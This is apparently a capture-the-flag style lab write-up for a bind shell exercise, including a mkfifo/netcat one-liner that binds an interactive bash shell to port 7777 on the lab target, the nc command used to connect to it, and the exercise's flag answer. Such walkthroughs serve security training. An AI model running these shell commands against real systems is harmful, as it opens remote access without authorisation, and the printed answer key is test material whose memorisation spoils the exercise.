### Bind Shell Exercise
 
IP: 10.129.201.134
 
---
 
### Question 1:
Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?
 
If they are issuing a listener on the target, putting it on port 443, then they will need to connect to that port on their attack box using the same port.
 
&#x1F6A9; found **443**.
 
---
 
### Question 2:
SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.
 
I start off by SSH'ing into the user using the given credentials, and then take a look at the host's IP, using `ip a`.
 
```diff
+ htb-student@ubuntu:~$ ip a
```
 
	<snip>
	    inet 10.129.201.134/16 brd 10.129.255.255 scope global dynamic ens160
	<snip>
 
I can see that it's 10.129.201.134, so I issue the following command to set up a bind shell that I can connect to on my local machine.
 
```diff
+ htb-student@ubuntu:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.134 7777 > /tmp/f
```
 
Then on my local machine, I run.
 
```diff
+ $ nc -nv 10.129.201.134 7777
```
 
	Connection to 10.129.201.134 7777 port [tcp/*] succeeded!
	To run a command as administrator (user "root"), use "sudo <command>".
	See "man sudo_root" for details.
	htb-student@ubuntu:~$
 
From here I take a look at the file mentioned in the question.
 
```diff
+ htb-student@ubuntu:~$ cat /customscripts/flag.txt
```
 
	B1nD_Shells_r_cool
 
&#x1F6A9; found **B1nD_Shells_r_cool**.
